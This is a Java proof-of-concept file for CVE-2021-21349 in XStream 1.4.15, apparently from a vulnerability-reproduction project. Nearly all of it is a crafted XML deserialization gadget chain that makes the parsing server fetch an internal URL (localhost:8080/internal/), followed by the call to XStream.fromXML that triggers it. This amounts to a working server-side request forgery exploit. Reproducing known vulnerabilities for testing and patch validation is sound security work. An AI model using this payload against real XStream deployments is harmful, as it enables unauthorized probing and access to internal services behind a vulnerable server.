package com.sectrend.xstream_v1_4_15;

import com.thoughtworks.xstream.XStream;

/**
 * @author 周德鹏
 * @version 1.0
 * @date 2023/9/20 16:50
 * @describe
 */
public class XSteamPoc_CVE_2021_21349 {
    public static void main(String[] args) {

        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='javafx.collections.ObservableList$1'/>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "      <dataHandler>\n" +
                "        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "          <contentType>text/plain</contentType>\n" +
                "          <is class='java.io.SequenceInputStream'>\n" +
                "            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
                "              <iterator class='com.sun.xml.internal.ws.util.ServiceFinder$ServiceNameIterator'>\n" +
                "                <configs class='sun.misc.FIFOQueueEnumerator'>\n" +
                "                  <queue>\n" +
                "                    <length>1</length>\n" +
                "                    <head>\n" +
                "                      <obj class='url'>http://localhost:8080/internal/</obj>\n" +
                "                    </head>\n" +
                "                    <tail reference='../head'/>\n" +
                "                  </queue>\n" +
                "                  <cursor reference='../queue/head'/>\n" +
                "                </configs>\n" +
                "                <returned class='sorted-set'/>\n" +
                "              </iterator>\n" +
                "              <type>KEYS</type>\n" +
                "            </e>\n" +
                "            <in class='java.io.ByteArrayInputStream'>\n" +
                "              <buf></buf>\n" +
                "              <pos>0</pos>\n" +
                "              <mark>0</mark>\n" +
                "              <count>0</count>\n" +
                "            </in>\n" +
                "          </is>\n" +
                "          <consumed>false</consumed>\n" +
                "        </dataSource>\n" +
                "        <transferFlavors/>\n" +
                "      </dataHandler>\n" +
                "      <dataLen>0</dataLen>\n" +
                "    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";

        System.out.println("开始");
        XStream xstream = new XStream();
        xstream.fromXML(xml);
        System.out.println("结束");
    }
}
